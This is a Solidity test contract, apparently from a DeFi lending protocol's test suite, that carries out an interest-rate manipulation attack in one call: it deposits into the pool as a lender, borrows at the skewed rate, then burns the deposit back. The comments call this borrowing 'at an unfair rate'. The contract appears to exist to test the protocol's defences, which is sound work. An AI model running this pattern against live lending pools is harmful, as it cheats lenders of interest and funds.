pragma solidity ^0.5.17;
pragma experimental ABIEncoderV2;
// "SPDX-License-Identifier: Apache-2.0"

import "../interfaces/IERC20.sol";

interface IToken {
	function burn(address receiver, uint256 burnAmount) external returns (uint256 loanAmountPaid);

	function mint(address receiver, uint256 depositAmount) external returns (uint256 mintAmount);

	function borrow(
		bytes32 loanId, /// 0 if new loan.
		uint256 withdrawAmount,
		uint256 initialLoanDuration, /// Duration in seconds.
		uint256 collateralTokenSent, /// If 0, loanId must be provided; any rBTC sent must equal this value.
		address collateralTokenAddress, /// If address(0), this means rBTC and rBTC must be sent with the call or loanId must be provided.
		address borrower,
		address receiver,
		bytes calldata /// loanDataBytes: arbitrary order data (for future use).
	)
		external
		payable
		returns (
			uint256,
			uint256 /// Returns new principal and new collateral added to loan.
		);
}

contract MintLoanAndBorrowTest {
	function callMintAndBorrowAndBurn(
		address loanToken, /// Underlying Token.
		address iToken, /// Lending Pool iToken.
		address collateralToken, /// Collateral Token.
		uint256 hackDepositAmount, /// Amount of underlying token to deposit on lending pool.
		uint256 withdrawAmount, /// Borrowing principal.
		uint256 collateralTokenSent /// Borrowing collateral.
	) public {
		IToken iTokenContract = IToken(iToken);

		/// @dev Allow the lending pool, iToken to get a deposit from this contract as a lender.
		IERC20(loanToken).approve(iToken, hackDepositAmount);

		/// @dev Check this contract has the underlying tokens to deposit.
		require(
			IERC20(loanToken).balanceOf(address(this)) >= hackDepositAmount,
			"This contract has not the required balance: hackDepositAmount."
		);

		/// @dev Check this contract has the allowance to move the tokens to the lending pool.
		require(
			IERC20(loanToken).allowance(address(this), iToken) >= hackDepositAmount,
			"This contract has not the allowance to move hackDepositAmount."
		);

		/// @dev Make a deposit as a lender, in order to manipulate the interest rate of the lending pool.
		iTokenContract.mint(address(this), hackDepositAmount);

		/// @dev Check this contract has the collateral tokens to deposit.
		require(
			IERC20(collateralToken).balanceOf(address(this)) >= collateralTokenSent,
			"This contract has not the required balance: collateralTokenSent."
		);

		/// @dev Borrow liquidity from the pool at an unfair rate.
		iTokenContract.borrow(
			"0x0", /// loanId, 0 if new loan.
			withdrawAmount,
			86400, /// initialLoanDuration
			collateralTokenSent,
			collateralToken, /// collateralTokenAddress
			address(this), /// borrower
			address(this), /// receiver
			"0x0"
		);

		/// @dev Get back the amount deposited in the first place.
		iTokenContract.burn(address(this), hackDepositAmount);
	}

	function getBalance(address loanToken) public view returns (uint256) {
		return IERC20(loanToken).balanceOf(address(this));
	}
}
